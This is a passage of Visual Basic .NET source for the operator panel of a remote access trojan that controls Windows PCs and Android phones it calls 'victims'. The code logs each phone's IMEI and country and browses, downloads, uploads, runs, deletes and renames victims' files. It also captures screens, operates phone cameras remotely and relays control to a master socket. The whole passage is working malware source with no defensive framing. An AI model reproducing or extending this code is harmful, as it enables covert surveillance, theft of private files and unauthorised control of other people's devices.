                                    ElseIf itm.Text.EndsWith(".asp") Or itm.Text.EndsWith(".aspx") Or itm.Text.EndsWith(".cer") Or itm.Text.EndsWith(".cfm") Or itm.Text.EndsWith(".css") Or itm.Text.EndsWith(".html") Or itm.Text.EndsWith(".htm") Or itm.Text.EndsWith(".js") Or itm.Text.EndsWith(".jsp") Or itm.Text.EndsWith(".part") Or itm.Text.EndsWith(".php") Or itm.Text.EndsWith(".rss") Or itm.Text.EndsWith(".xhtml") Or itm.Text.EndsWith(".php5") Then
                                        itm.ImageIndex = 15
                                        itm.SubItems.Add("Compiled Web Application file")
                                    Else
                                        itm.ImageIndex = 7
                                        itm.SubItems.Add("Unrecognized file to the Trojan")
                                    End If

                                    File_Manager_Form.ListView1.Items.Add(itm)
                                    i += 1
                                Next
                            End If
                        Catch ex As Exception

                        End Try

                    End If
                    'Dim fff As FileManager = My.Application.OpenForms("openfm" & sock)

                    'Dim lolo = fff.ListView1.Items.Add(a(1), getdrives(a(2)))


                Case "flashaya" 'From VBClient
                    If if_fm_undercontrol = True Then

                        'send to master 
                        Dim dr As New ListViewItem
                        dr.Text = StringArray(1)
                        dr.SubItems.Add(StringArray(2) & " Drive")
                        If StringArray(2).Contains("Fix") Then
                            dr.ImageIndex = 2
                        ElseIf StringArray(2).Contains("CD") Then
                            dr.ImageIndex = 5
                        ElseIf StringArray(2).Contains("Remov") Then
                            dr.ImageIndex = 3
                        ElseIf StringArray(2).Contains("Net") Then
                            dr.ImageIndex = 4
                        Else
                            dr.ImageIndex = 3
                        End If

                        If master_sock > -1 Then
                            Server.Send(master_sock, "vc_fm_flashaya" & YY & Server.IP(sock) & YY & StringArray(1) & YY & StringArray(2) & YY)


                        End If

                    Else
                        Try

                            Dim File_Manager_Form As FileManager = My.Application.OpenForms("fmg" & sock)

                            Dim dr As New ListViewItem
                            dr.Text = StringArray(1)
                            dr.SubItems.Add(StringArray(2) & " Drive")
                            If StringArray(2).Contains("Fix") Then
                                dr.ImageIndex = 2
                            ElseIf StringArray(2).Contains("CD") Then
                                dr.ImageIndex = 5
                            ElseIf StringArray(2).Contains("Remov") Then
                                dr.ImageIndex = 3
                            ElseIf StringArray(2).Contains("Net") Then
                                dr.ImageIndex = 4
                            Else
                                dr.ImageIndex = 3
                            End If
                            File_Manager_Form.ListView1.Items.Add(dr)

                        Catch ex As Exception

                        End Try

                    End If




                Case "success_run"
                    MsgBox("Recieved from [" & Server.IP(sock) & "]" & vbNewLine & "File Was Executed Successfully On : " & Server.IP(sock), MsgBoxStyle.Information, "Run file From Disk")
                Case "success_up"
                    ' MsgBox("File Was Uploaded Successfully On : " & Server.IP(sock) & vbNewLine & "Refreshing File Manager ........", MsgBoxStyle.Information, "File Manager")
                    Try
                        Dim File_Manager_Form As FileManager = My.Application.OpenForms("fmg" & sock)

                        File_Manager_Form.Label3.Text = ("File Was Uploaded Successfully On : " & Server.IP(sock) & vbNewLine & "Refreshing File Manager ........")
                        File_Manager_Form.ref()
                    Catch ex As Exception

                    End Try
                Case "savefile"
                    Dim fsting As String = ""
                    Try
                        fsting = StringArray(2)
                        If IO.Directory.Exists(Application.StartupPath & "\" & "VictimComputers_Downloads") Then
                            IO.File.WriteAllBytes((Application.StartupPath & "\" & "VictimComputers_Downloads") & "\" & StringArray(1), Convert.FromBase64String(fsting))
                            Threading.Thread.CurrentThread.Sleep(1000)
                            Process.Start(Application.StartupPath & "\" & "VictimComputers_Downloads")

                            MsgBox("Download Complete " & vbNewLine & " File Saved in  : " & vbNewLine & (Application.StartupPath & "\" & "VictimComputers_Downloads") & "\" & StringArray(1), MsgBoxStyle.Information, "File Download Completed")


                        Else
                            Try
                                IO.File.WriteAllBytes((Application.StartupPath & "\" & "VictimComputers_Downloads") & "\" & StringArray(1), Convert.FromBase64String(fsting))
                                Threading.Thread.CurrentThread.Sleep(1000)
                                Process.Start(Application.StartupPath & "\" & "VictimComputers_Downloads")

                                MsgBox("Download Complete " & vbNewLine & " File Saved in  : " & vbNewLine & (Application.StartupPath & "\" & "VictimComputers_Downloads") & "\" & StringArray(1), MsgBoxStyle.Information, "File Download Completed")


                            Catch ex As Exception
                                MsgBox("Cannot Create Directory in : " & Application.StartupPath & vbNewLine & " Exception : " & ex.Message & vbNewLine & "the Downloaded file wasn`t saved [Redownload it]", MsgBoxStyle.Critical)
                            End Try

                        End If

                    Catch ex As Exception

                    End Try
                Case "errorread"
                    If Me.InvokeRequired Then
                        Dim j As New _Handle_Data_Event(AddressOf Handle_Data_Event)
                        Me.Invoke(j, New Object() {sock, bytearray})
                        Exit Sub
                    End If
                    MsgBox("Cannot Modify [Delete / Rename] File Within : " & Server.IP(sock) & vbNewLine & "The file may be in use or not readable", MsgBoxStyle.Exclamation)

                Case "errorf"
                    If Me.InvokeRequired Then
                        Dim j As New _Handle_Data_Event(AddressOf Handle_Data_Event)
                        Me.Invoke(j, New Object() {sock, bytearray})
                        Exit Sub
                    End If
                    MsgBox("Cannot Download File From : " & Server.IP(sock) & vbNewLine & "The file may be in use or not readable", MsgBoxStyle.Exclamation)
                Case "rename_succ"
                    Try
                        Dim File_Manager_Form As FileManager = My.Application.OpenForms("fmg" & sock)

                        File_Manager_Form.Label3.Text = ("File Was Renamed Successfully On : " & Server.IP(sock) & vbNewLine & "Refreshing File Manager ........")
                        File_Manager_Form.ref()
                    Catch ex As Exception

                    End Try


                Case "C_folder_s"
                    Try
                        Dim File_Manager_Form As FileManager = My.Application.OpenForms("fmg" & sock)

                        File_Manager_Form.Label3.Text = ("Folder Was Created Successfully")
                        File_Manager_Form.ref()
                    Catch ex As Exception

                    End Try

                Case "C_folder_ex"
                    If Me.InvokeRequired Then
                        Dim j As New _Handle_Data_Event(AddressOf Handle_Data_Event)
                        Me.Invoke(j, New Object() {sock, bytearray})
                        Exit Sub
                    End If
                    Try
                        Dim File_Manager_Form As FileManager = My.Application.OpenForms("fmg" & sock)

                        File_Manager_Form.Label3.Text = ("Cannot Create Folder " & vbNewLine & " Exception Received :" & vbNewLine & StringArray(1))
                        File_Manager_Form.ref()
                    Catch ex As Exception

                    End Try



                Case "controller"
                    Try

                    Catch ex As Exception

                    End Try

                Case "send_vc"
                    Try
                        Try
                            For Each item As ListViewItem In client_list_l1.Items

                                Dim infoline As String = item.SubItems(0).Text & "|vc|" & item.SubItems(1).Text & "|vc|" & item.SubItems(2).Text & "|vc|" & item.SubItems(3).Text & "|vc|" & item.SubItems(4).Text & "|vc|" & item.SubItems(5).Text & "|vc|"
                                Server.Send_DX(sock, "sirvc" & YY & infoline & YY)

                            Next
                        Catch ex As Exception

                        End Try
                    Catch ex As Exception

                    End Try

                Case "send_fm"

                    Try

                        Dim DriveList As String() = System.Environment.GetLogicalDrives()
                        For i As Integer = 0 To DriveList.Length - 1
                            Dim d As New System.IO.DriveInfo(DriveList(i))
                            Server.Send_DX(sock, "flashaya_ms" & YY & d.Name & YY & d.DriveType.ToString & YY)
                        Next





                    Catch ex As Exception

                    End Try
                Case "FileManager_ms"
                    Server.Send_DX(sock, "filemanager_ms" & YY & getFolders(StringArray(1)) & getFiles(StringArray(1)))
                Case "desktop_ms"
                    Try
                        cap.Clear()
                    Catch ex As Exception

                    End Try

                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    Server.Send_DX(sock, "desktop_ms" & YY & s.Width & YY & s.Height)

                Case "cap_ms@"
                    Try
                        Dim SizeOfimage As Integer = StringArray(1)
                        Dim Split As Integer = StringArray(2)
                        Dim Quality As Integer = StringArray(3)

                        Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
                        Dim M As New IO.MemoryStream
                        Dim CMD As String = "@_ms" & YY
                        M.Write(Return_Byte_array(CMD), 0, CMD.Length)
                        M.Write(Bb, 0, Bb.Length)
                        Server.Send(sock, M.ToArray)
                        M.Dispose()
                    Catch ex As Exception
                    End Try

                Case "vc_fm_open"

                    Dim vc_ip As String = StringArray(1)

                    For Each item As ListViewItem In client_list_l1.Items
                        If item.SubItems(4).Text.Equals(vc_ip) Then

                            Server.Send(item.ToolTipText, "openfm" & SplitData)

                            if_fm_undercontrol = True
                            master_sock = sock
                            Exit For
                        End If
                    Next
                Case "vc_fm_getalldrives"
                    Dim vc_ip As String = StringArray(1)
                    Dim command As String = StringArray(2)
                    For Each item As ListViewItem In client_list_l1.Items
                        If item.SubItems(4).Text.Equals(vc_ip) Then

                            Server.Send(item.ToolTipText, command & SplitData)

                            if_fm_undercontrol = True
                            master_sock = sock
                            Exit For
                        End If
                    Next
                Case "vc_fm_commd"
                    Dim vc_ip As String = StringArray(1)
                    Dim command As String = StringArray(2)

                    If command.Equals("endcon") Then
                        For Each item As ListViewItem In client_list_l1.Items
                            If item.SubItems(4).Text.Equals(vc_ip) Then

                                Server.Send(item.ToolTipText, command & YY)

                                if_fm_undercontrol = False
                                master_sock = -1
                                Exit For
                            End If
                        Next
                    End If
                    If command.Equals("FileManager") Or command.Equals("sendme") Or command.Equals("delete") Or command.Equals("execute") Then
                        For Each item As ListViewItem In client_list_l1.Items
                            If item.SubItems(4).Text.Equals(vc_ip) Then

                                Server.Send(item.ToolTipText, command & YY & StringArray(3) & YY)

                                if_fm_undercontrol = True
                                master_sock = sock
                                Exit For
                            End If
                        Next
                    End If
                    If command.Equals("crefolder") Or command.Equals("upfile") Or command.Equals("rulnk") Or command.Equals("rufle") Then
                        For Each item As ListViewItem In client_list_l1.Items
                            If item.SubItems(4).Text.Equals(vc_ip) Then

                                Server.Send(item.ToolTipText, command & YY & StringArray(3) & YY & StringArray(4) & YY)

                                if_fm_undercontrol = True
                                master_sock = sock
                                Exit For
                            End If
                        Next
                    End If
                    If command.Equals("renamefolder") Or command.Equals("renamefile") Then
                        For Each item As ListViewItem In client_list_l1.Items
                            If item.SubItems(4).Text.Equals(vc_ip) Then

                                Server.Send(item.ToolTipText, command & YY & StringArray(3) & YY & StringArray(4) & YY & StringArray(5) & YY)

                                if_fm_undercontrol = True
                                master_sock = sock
                                Exit For
                            End If
                        Next
                    End If
                Case "ref_mast_soc"

                    master_sock = sock


                    ' ss()
            End Select
            Exit Sub


Android_Part:

            Dim Refined_Array As String = Redsign_Android_array(Split(BSS(bytearray), SplitData))
            ' MsgBox(BSS(bytearray))
            If Refined_Array.Equals("||") = False Then
                Dim Final_Array_1 As String() = Split(Refined_Array, "||")
                Select Case Final_Array_1(0)
                    Case "info"

                        Try

                            Dim android_country As String = GetState(Final_Array_1(1).ToUpperInvariant)

                            If android_country.Equals("UNKnowen") Then
                                android_country = Final_Array_1(1)
                            End If
                            Dim android_version As String = Final_Array_1(3) & " " & Final_Array_1(4)
                            Dim android_service_name As String = Final_Array_1(2)
                            Dim android_ime_serv As String = Final_Array_1(5)
                            Dim phone_imei As String = Split(android_ime_serv, Split_Packets)(1)
                            Try
                                If My.Application.OpenForms("notif_X" & sock) IsNot Nothing Then Exit Sub
                                If Me.InvokeRequired Then
                                    Dim j As New _Handle_Data_Event(AddressOf Handle_Data_Event)
                                    Me.Invoke(j, New Object() {sock, bytearray})
                                    Exit Sub
                                End If
                                Dim CompForm As New Notification
                                CompForm.sock = sock
                                CompForm.Name = "notif_X" & sock
                                CompForm.Label9.Text = Server.IP(sock)
                                CompForm.Label5.Text = android_service_name
                                CompForm.Label7.Text = "IMEI : " & phone_imei
                                CompForm.Label6.Text = "Android " & android_version
                                CompForm.Label8.Text = android_country
                                CompForm.Show()
                            Catch ex As Exception

                            End Try

                            Dim lx = client_list_l1.Items.Add(sock.ToString, android_service_name, Get_VICOS_IMG_index("Android"))
                            Try
                                ListBox1.Items.Add("New Android Victim : " & Server.IP(sock) & " | IMEI : " & phone_imei & " | Country : " & android_country)
                            Catch ex As Exception

                            End Try
                            lx.ToolTipText = sock

                            If phone_imei.Length > 5 Then
                                lx.SubItems.Add("Mobile phone IMEI : " & phone_imei)
                            Else
                                lx.SubItems.Add("Mobile phone")
                            End If
                            lx.SubItems.Add("Android " & android_version)
                            lx.SubItems.Add(android_country)
                            Try
                                lx.SubItems.Add(Server.IP(sock))
                            Catch ex As Exception
                                lx.SubItems.Add("NULL IP")
                            End Try
                            lx.SubItems.Add("null")
                            Server.Send_DX(lx.ToolTipText, "re_updating" & SplitData)

                        Catch ex As Exception

                        End Try

                    Case "re_updating"


                        For Each item As ListViewItem In client_list_l1.Items

                            If item.SubItems(1).Text.Contains("phone") Then
                                If item.SubItems(4).Text.Equals(Server.IP(sock)) Then

                                    item.SubItems(5).Text = "Phone " & Final_Array_1(1)
                                ElseIf item.ToolTipText.Equals(sock) Then
                                    item.SubItems(5).Text = "Phone " & Final_Array_1(1)

                                End If
                            End If

                        Next
                    Case "chat"
                        If Refined_Array.Contains("chat") Then
                            If Refined_Array.Contains("Client") Then
                                Dim chat_string As String() = Split(Refined_Array, "||")
                                Dim chatline As String = chat_string(1)
                                chatline = chatline.Replace(split_Ary, "")
                                Dim cht_ary2 As String() = Split(chatline, Split_Packets)
                                Dim reply_chat As String = cht_ary2(0)
                                Dim fx As Android_chat = My.Application.OpenForms("android_chat" & sock)
                                fx.RichTextBox1.AppendText(reply_chat & vbNewLine)
                            End If
                        End If

                        If My.Application.OpenForms("android_chat" & sock) IsNot Nothing Then Exit Sub
                        If Me.InvokeRequired Then
                            Dim j As New _Handle_Data_Event(AddressOf Handle_Data_Event)
                            Me.Invoke(j, New Object() {sock, bytearray})
                            Exit Sub
                        End If
                        Dim Aroid As New Android_chat
                        Aroid.sock = sock
                        Aroid.Name = "android_chat" & sock
                        Aroid.Text &= " " & Server.IP(sock)
                        Aroid.Show()
                    Case "camera_manager_capture"

                    Case "vc_android_cam_command"
                        Dim vc_ip As String = Final_Array_1(1)
                        Dim command As String = Final_Array_1(2)
                        Try
                            For Each item As ListViewItem In client_list_l1.Items
                                If item.SubItems(4).Text.Equals(vc_ip) Then
                                    If command.Equals("camera_manager_stop") Or command.Equals("camera_manager_find_camera") Then
                                        Server.Send_DX(item.ToolTipText, command & SplitData)

                                    End If
                                    If command.Equals("camera_manager_capture") Then
                                        Server.Send_DX(item.ToolTipText, "camera_manager_capture" & SplitData & Final_Array_1(3) & SplitData & Final_Array_1(4) & SplitData & Final_Array_1(5))
                                        if_android_cam_underC = True
                                        master_sock = sock
                                    End If
                                    If command.Equals("camera_manager_stop") Then
                                        if_android_cam_underC = False
                                        master_sock = sock
                                    End If
                                    if_android_cam_underC = True
                                    master_sock = sock
                                    Exit For
                                End If
                            Next
                        Catch ex As Exception

                        End Try
                        if_android_cam_underC = True
                        master_sock = sock
                        Exit Sub
                    Case "vc_android_cam"
                        Dim vc_ip As String = Final_Array_1(1)

                        For Each item As ListViewItem In client_list_l1.Items
                            If item.SubItems(4).Text.Equals(vc_ip) Then

                                Server.Send_DX(item.ToolTipText, "camera_manager_find_camera" & SplitData)

                                if_android_cam_underC = True
                                master_sock = sock
                                Exit Sub
                            End If
                        Next
                    Case "camera_manager"

                        If if_android_cam_underC = True Then
                            Try

                                If Refined_Array.Contains("cam") Then
                                    If Refined_Array.Contains("Found") Then
                                        If master_sock > -1 Then

                                            Server.Send(master_sock, "vc_cam_android_found" & YY & Server.IP(sock) & YY & Refined_Array.Replace("||", ",vx,") & YY)
                                            if_android_fm_underC = False
                                            Exit Sub
                                        End If

                                    End If
                                End If
                                if_android_cam_underC = False
                                Exit Try
                            Catch ex As Exception

                            End Try

                            if_android_cam_underC = False
                            Exit Sub
                        End If



                        If Refined_Array.Contains("cam") Then
                            If Refined_Array.Contains("Found") Then

                                If My.Application.OpenForms("android_cam" & sock) IsNot Nothing Then GoTo REshowLINE
                                If Me.InvokeRequired Then
                                    Dim j As New _Handle_Data_Event(AddressOf Handle_Data_Event)
                                    Me.Invoke(j, New Object() {sock, bytearray})
                                    GoTo REshowLINE
                                End If
                                Dim Aroid As New Android_cam
                                Aroid.sock = sock
                                Aroid.Name = "android_cam" & sock
                                Aroid.Text &= " " & Server.IP(sock)
                                Aroid.Show()


REshowLINE:
                                Dim fx As Android_cam = My.Application.OpenForms("android_cam" & sock)
                                fx.Raised_Data(Refined_Array)

                            ElseIf Refined_Array.Contains("ITookPicture") Then
                                Dim fx As Android_cam = My.Application.OpenForms("android_cam" & sock)
                                fx.Raised_Data(Refined_Array)


                            ElseIf Refined_Array.Contains("Back") Or Refined_Array.Contains("Front") Then
                                Try

                                    Dim fx As Android_cam = My.Application.OpenForms("android_cam" & sock)
                                    fx.Raised_Data(Refined_Array)
                                Catch ex As Exception
                                    If My.Application.OpenForms("android_cam" & sock) IsNot Nothing Then Exit Try
                                    If Me.InvokeRequired Then
                                        Dim j As New _Handle_Data_Event(AddressOf Handle_Data_Event)
                                        Me.Invoke(j, New Object() {sock, bytearray})
                                        Exit Try
                                    End If
                                    Dim Aroid As New Android_cam
                                    Aroid.sock = sock
                                    Aroid.Name = "android_cam" & sock
                                    Aroid.Text &= " " & Server.IP(sock)
                                    Aroid.Show()

                                    Dim ARY2 As String() = Split(Refined_Array, SplitData)
                                    Dim CamDrives_lines As String = ARY2(1)
                                    Dim CamDrives_Ary As String() = Split(CamDrives_lines, split_Line)

                                    For Each Cam_DRV As String In CamDrives_Ary
                                        If Cam_DRV.Contains(split_Ary) Then
                                            Cam_DRV = Cam_DRV.Replace(split_Ary, "")
                                            ' Aroid.ComboBox1.Items.Add(Cam_DRV)
                                        End If
                                    Next
                                End Try
                            End If

                        End If

                        'Public split_Ary As String = "c0c1c3a2c0c1c"
                        'Public split_Line As String = "9xf89fff9xf89"
                        'Public Split_Packets As String = "b4x7004x700x4b" 
                        'Public split_paths As String = "e1x1114x61114e"
                        'Public SplitData As String = "fxf0x4x4x0fxf"  
                        'Public Syn As String = "c2x2824x828200x0c"  
                    Case "vc_fm_open"

                        Dim vc_ip As String = Final_Array_1(1)

                        For Each item As ListViewItem In client_list_l1.Items
                            If item.SubItems(4).Text.Equals(vc_ip) Then

                                Server.Send_DX(item.ToolTipText, "file_manager" & SplitData & "GetPath^&")

                                if_android_fm_underC = True
                                master_sock = sock
                                Exit For
                            End If
                        Next

                    Case "vc_android_fm_command"
                        Dim vc_ip As String = Final_Array_1(1)
                        Dim command As String = Final_Array_1(2)
                        For Each item As ListViewItem In client_list_l1.Items
                            If item.SubItems(4).Text.Equals(vc_ip) Then
                                If command.Equals("file_manager") Or command.Equals("notepad") Or command.Equals("file_manager_delete") Or command.Equals("download_manager") Or command.Equals("view_photo") Then
                                    If command.Equals("download_manager") Then
                                        if_fm_download = True
                                        master_sock = sock
                                    End If
                                    Server.Send_DX(item.ToolTipText, command & SplitData & Final_Array_1(3))
                                End If
                                If command.Equals("upload_file") Or command.Equals("file_manager_rename") Or command.Equals("file_manager_delete") Or command.Equals("file_manager_write_file") Or command.Equals("file_manager_start_playback") Then
                                    Server.Send_DX(item.ToolTipText, command & SplitData & Final_Array_1(3) & SplitData & Final_Array_1(4) & SplitData)
                                End If

                                if_android_fm_underC = True
                                master_sock = sock
                                Exit For
                            End If
                        Next
                    Case "file_manager"
                        Try

                            If if_android_fm_underC = True Then
                                If master_sock > -1 Then

                                    Server.Send(master_sock, "vc_fm_android" & YY & Server.IP(sock) & YY & Refined_Array & YY)
                                    if_android_fm_underC = False
                                    Exit Sub
                                End If
                            End If
                        Catch ex As Exception

                        End Try

                        Dim Tries As Integer = 0
RETRY_FM:

                        If My.Application.OpenForms("android_filemanager" & sock) IsNot Nothing Then GoTo BYBASS_Line
                        If Me.InvokeRequired Then
                            Dim j As New _Handle_Data_Event(AddressOf Handle_Data_Event)
                            Me.Invoke(j, New Object() {sock, bytearray})
                            GoTo BYBASS_Line
                        End If
                        Dim Aroid As New Android_filemanager
                        Aroid.sock = sock
                        Aroid.Name = "android_filemanager" & sock
                        Aroid.Text &= " " & Server.IP(sock)
                        Aroid.Show()

BYBASS_Line:

                        Try
                            Dim fx As Android_filemanager = My.Application.OpenForms("android_filemanager" & sock)

                            If Refined_Array.Contains("[My/Exception]") Then
                                Try
                                    Dim EXP_ARY As String() = Split(Refined_Array, Split_Packets)
                                    Dim EXP_ARY2 As String = EXP_ARY(0).Replace("[My/Exception]", "")
                                    If EXP_ARY2.Contains("file_manager||") Then
                                        EXP_ARY2 = EXP_ARY2.Replace("file_manager||", "")
                                    End If
                                    Dim file_dir_name As String = (Split(EXP_ARY2, ":"))(0)
                                    Dim file_Expetion As String = (Split(EXP_ARY2, ":"))(1) & (Split(EXP_ARY2, ":"))(2)

                                    fx.Raised_Exption(file_dir_name, file_Expetion)
                                Catch ex As Exception
                                    ' MsgBox("Cast Failed Exception Recived [may be ReadOnly File system]" & vbNewLine & "Reloop", MsgBoxStyle.Critical)
                                End Try

                            End If '
                            If Refined_Array.Contains("[MyBase64/Photo]") Then
                                Try
                                    Dim EXP_ARY As String() = Split(Refined_Array, Split_Packets)
                                    Dim EXP_ARY2 As String = EXP_ARY(0).Replace("[MyBase64/Photo]", "")
                                    If EXP_ARY2.Contains("file_manager||") Then
                                        EXP_ARY2 = EXP_ARY2.Replace("file_manager||", "")
                                    End If

                                    fx.Image_Viewer(EXP_ARY2)

                                Catch ex As Exception
                                    ' MsgBox("Cast Failed Exception Recived [may be ReadOnly File system]" & vbNewLine & "Reloop", MsgBoxStyle.Critical)
                                End Try

                            End If '"[MyBase64/Photo]"
                            Dim REC_ARY As String() = Split(Refined_Array, split_paths)
                            Dim parent_path As String = REC_ARY(0).Replace(split_Line, "")
                            Dim parent_path_ary As String() = Split(parent_path, split_Ary)
                            Dim final_parent As String = parent_path_ary(parent_path_ary.Length - 1)
                            '   fx.TextBox1.Text = final_parent
                            Dim cdindex As Integer = 0
                            For Each x As String In REC_ARY
                                'fx.TextBox1.Text = REC_ARY(1)
                                Dim X_ARY As String() = Split(x, split_Line)
                                For Each z As String In X_ARY
                                    If z.Length > 1 Then
                                        ' MsgBox("index " & cdindex & "  " & z)
                                        Dim folders_name_filexnumb_extention As String() = Split(z, split_Ary)

                                        If folders_name_filexnumb_extention(0).Contains("Folder") Then

                                            Dim lx As New ListViewItem

                                            lx.Text = folders_name_filexnumb_extention(1)
                                            lx.ImageIndex = 0
                                            lx.SubItems.Add(folders_name_filexnumb_extention(0).Replace("file_manager||", ""))
                                            lx.SubItems.Add("")
                                            If fx.check_ifExist(lx.Text) = False Then
                                                If lx.Text.Equals("") = False Then
                                                    fx.ListView1.Items.Add(lx)
                                                End If
                                            End If

                                        End If
                                        If folders_name_filexnumb_extention(0).Contains("Ext") Then
                                            Try
                                                Dim lx As New ListViewItem

                                                lx.Text = folders_name_filexnumb_extention(1)
                                                lx.SubItems.Add("File [N/A]")
                                                If lx.Text.EndsWith(".rc") Or lx.Text.EndsWith(".prop") Then
                                                    lx.ImageIndex = 2
                                                ElseIf lx.Text.EndsWith(".rtf") Or lx.Text.EndsWith(".docx") Or lx.Text.EndsWith(".doc") Then
                                                    lx.ImageIndex = 3
                                                ElseIf lx.Text.EndsWith(".pdf") Then
                                                    lx.ImageIndex = 4
                                                ElseIf lx.Text.EndsWith(".jpeg") Or lx.Text.EndsWith(".jpg") Or lx.Text.EndsWith(".png") Or lx.Text.EndsWith(".tif") Or lx.Text.EndsWith(".gif") Then
                                                    lx.ImageIndex = 11
                                                ElseIf lx.Text.EndsWith(".mp3") Or lx.Text.EndsWith(".wav") Or lx.Text.EndsWith(".amer") Or lx.Text.EndsWith(".amr") Then
                                                    lx.ImageIndex = 8
                                                ElseIf lx.Text.EndsWith(".mp4") Or lx.Text.EndsWith(".3gp") Then
                                                    lx.ImageIndex = 9
                                                ElseIf lx.Text.EndsWith(".xml") Or lx.Text.EndsWith(".html") Or lx.Text.EndsWith(".htm") Then
                                                    lx.ImageIndex = 7
                                                Else

                                                    lx.ImageIndex = 1
                                                End If

                                                lx.SubItems.Add(FormatFileSize(CType(folders_name_filexnumb_extention(2), Long)))
                                                If fx.check_ifExist(lx.Text) = False Then
                                                    If lx.Text.Equals("") = False Then
                                                        fx.ListView1.Items.Add(lx)
                                                    End If
                                                End If
                                            Catch ex As Exception
                                            End Try
                                        End If
                                        cdindex += 1
                                    Else
                                        Dim X_ARY2 As String() = Split(x, split_Ary)
                                        For Each zx As String In X_ARY2
                                            If zx.Length > 1 Then
                                                Dim folders_name_filexnumb_extention As String() = Split(zx, split_Line)
                                                Try
                                                    If folders_name_filexnumb_extention(0).Contains("N/") = False And folders_name_filexnumb_extention(0).Equals("-1") = False And folders_name_filexnumb_extention(0).Contains("file") = False And folders_name_filexnumb_extention(0).Contains("/") = False Then
                                                        For Each itm As ListViewItem In fx.ListView1.Items
                                                            Dim sizp As String = itm.SubItems(2).Text
                                                            If sizp.Equals(FormatFileSize(CType(folders_name_filexnumb_extention(1), Long))) = False Then
                                                                Dim lx As New ListViewItem
                                                                lx.Text = folders_name_filexnumb_extention(0)
                                                                If lx.Text.EndsWith(".rc") Or lx.Text.EndsWith(".prop") Then
                                                                    lx.ImageIndex = 2
                                                                ElseIf lx.Text.EndsWith(".rtf") Or lx.Text.EndsWith(".docx") Or lx.Text.EndsWith(".doc") Then
                                                                    lx.ImageIndex = 3
                                                                ElseIf lx.Text.EndsWith(".pdf") Then
                                                                    lx.ImageIndex = 4
                                                                ElseIf lx.Text.EndsWith(".jpeg") Or lx.Text.EndsWith(".jpg") Or lx.Text.EndsWith(".png") Or lx.Text.EndsWith(".tif") Or lx.Text.EndsWith(".gif") Then
                                                                    lx.ImageIndex = 11
                                                                ElseIf lx.Text.EndsWith(".mp3") Or lx.Text.EndsWith(".wav") Or lx.Text.EndsWith(".amer") Or lx.Text.EndsWith(".amr") Then
                                                                    lx.ImageIndex = 8
                                                                ElseIf lx.Text.EndsWith(".mp4") Or lx.Text.EndsWith(".3gp") Then
                                                                    lx.ImageIndex = 9
                                                                ElseIf lx.Text.EndsWith(".xml") Or lx.Text.EndsWith(".html") Or lx.Text.EndsWith(".htm") Then
                                                                    lx.ImageIndex = 7
                                                                Else
                                                                    lx.ImageIndex = 1
                                                                End If
                                                                If fx.check_ifExist(lx.Text) = False Then
                                                                    If lx.Text.Equals("") = False Then
                                                                        fx.ListView1.Items.Add(lx)
                                                                    End If
                                                                End If
                                                            End If
                                                        Next
                                                    End If

                                                Catch ex As Exception

                                                End Try


                                            End If
                                        Next

                                    End If

                                Next

                            Next

                        Catch ex As Exception
                            If Tries = 2 Then
                                Exit Try
                            End If
                            Tries += 1
                            GoTo RETRY_FM

                        End Try


                        'Public split_Ary As String = "c0c1c3a2c0c1c"
                        'Public split_Line As String = "9xf89fff9xf89"
                        'Public Split_Packets As String = "b4x7004x700x4b" 
                        'Public split_paths As String = "e1x1114x61114e"
                        'Public SplitData As String = "fxf0x4x4x0fxf"  
                        'Public Syn As String = "c2x2824x828200x0c"  

                    Case "notepad" 'Edit file text

                        If My.Application.OpenForms("android_fileedit" & sock) IsNot Nothing Then GoTo BYBASS_notepad
                        If Me.InvokeRequired Then
                            Dim j As New _Handle_Data_Event(AddressOf Handle_Data_Event)
                            Me.Invoke(j, New Object() {sock, bytearray})
                            GoTo BYBASS_notepad
                        End If
                        Dim Aroid As New Android_File_editor
                        Aroid.sock = sock
                        Aroid.Name = "android_fileedit" & sock
                        Aroid.Text &= " " & Server.IP(sock)
                        Aroid.Show()
BYBASS_notepad:

                        Try
                            Dim fx As Android_File_editor = My.Application.OpenForms("android_fileedit" & sock)
                            fx.Label1.Text = "File : " & Final_Array_1(2)
                            fx.RichTextBox1.Text = Final_Array_1(1)
                            fx.filepaTH = (Split(Final_Array_1(3), Split_Packets))(0)

                        Catch ex As Exception
                        End Try

                    Case "download_manager"
                        Dim file_nx As String = Final_Array_1(1)
                        If if_fm_download = True Then

                            Dim file_bytes As String = Final_Array_1(3)
                            Dim file_name As String = Final_Array_1(1)

                            If master_sock > -1 Then

                                Server.Send(master_sock, "vc_fm_android_download" & YY & Server.IP(sock) & YY & file_name & YY & file_bytes & YY)
                                Exit Sub
                            End If
                            if_fm_download = False
                            Exit Sub
                        End If
                        If Final_Array_1(2).Equals("0") Then
                            If My.Application.OpenForms("android_filedwnman" & sock) IsNot Nothing Then GoTo BYBASS_dwman
                            If Me.InvokeRequired Then
                                Dim j As New _Handle_Data_Event(AddressOf Handle_Data_Event)
                                Me.Invoke(j, New Object() {sock, bytearray})
                                GoTo BYBASS_dwman
                            End If
                            Dim Aroid As New Android_FileDownloader
                            Aroid.sock = sock
                            Aroid.Name = "android_filedwnman" & sock
                            Aroid.Text &= " " & Server.IP(sock)
                            Aroid.Show()

                        End If

BYBASS_dwman:           If Final_Array_1(2).Equals("1") Then

                            Try
                                Dim fx As Android_FileDownloader = My.Application.OpenForms("android_filedwnman" & sock)
                                fx.Label1.Text = "File : " & file_nx
                                fx.Label2.Text = "Downloading"
                                If System.IO.Directory.Exists(Application.StartupPath & "\Mobile_Downloads\") Then
                                    Dim download_folder As String = (Application.StartupPath & "\Mobile_Downloads\")
                                    fx.WriteBytes(Final_Array_1(3), Final_Array_1(1), download_folder)
                                Else
                                    Try
                                        System.IO.Directory.CreateDirectory(Application.StartupPath & "\Mobile_Downloads\")
                                    Catch ex As Exception
                                        MsgBox("Cannot Create Directory , Exception : " & ex.Message, MsgBoxStyle.Critical)
                                        Exit Sub
                                    End Try

                                    Dim download_folder As String = (Application.StartupPath & "\Mobile_Downloads\")
                                    fx.WriteBytes(Final_Array_1(3), Final_Array_1(1), download_folder)
                                End If

                            Catch ex As Exception

                                Dim fx As Android_FileDownloader = My.Application.OpenForms("android_filedwnman" & sock)
                                fx.Label1.Text = "File : " & file_nx
                                fx.Label2.Text = "Failed to Download [File may be very large] " & vbNewLine & "Exception Message : [File READ]"



                            End Try
                        Else
                            Dim fx As Android_FileDownloader = My.Application.OpenForms("android_filedwnman" & sock)
                            fx.Button1.Enabled = False
                            fx.ProgressBar1.Value = 0
